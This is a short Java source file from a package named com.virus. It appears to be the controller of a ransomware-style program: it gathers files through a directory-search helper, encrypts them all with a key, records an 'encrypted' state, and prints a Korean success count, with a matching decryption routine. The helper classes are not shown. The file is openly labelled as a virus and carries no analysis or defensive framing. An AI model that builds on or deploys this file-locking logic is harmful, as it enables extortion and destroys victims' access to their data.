package com.virus;

import com.virus.security.CryptoUtils;
import com.virus.security.SearchDirectory;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by codertimo on 15. 11. 26..
 */
public class EncryptionController
{

    private SearchDirectory searchDirectory;
    private boolean isEncrypted = false;
    private String key;

    public EncryptionController(String key)
    {
        this.searchDirectory = new SearchDirectory();
        this.key = key;
        this.isEncrypted = searchDirectory.isEncrypted();
    }

    public boolean isEncrypted()
    {
        return this.isEncrypted;
    }

    public  void encryption()
    {
            ArrayList<File> files = searchDirectory.allFileSearch();
            searchDirectory.setEncrypted();
            CryptoUtils.encrypt(files, key);
            System.out.print(files.size() + "개의 파일 암호화 성공");
            searchDirectory.clearFiles();

    }

    public  void decryption()
    {
            ArrayList<File> encrypted_files = searchDirectory.decryptSearch();
            CryptoUtils.decrypt(encrypted_files, key);
            System.out.println(encrypted_files.size() + "개 파일 복호화 성공");
            searchDirectory.setDecrypted();
            searchDirectory.clearFiles();
    }


}
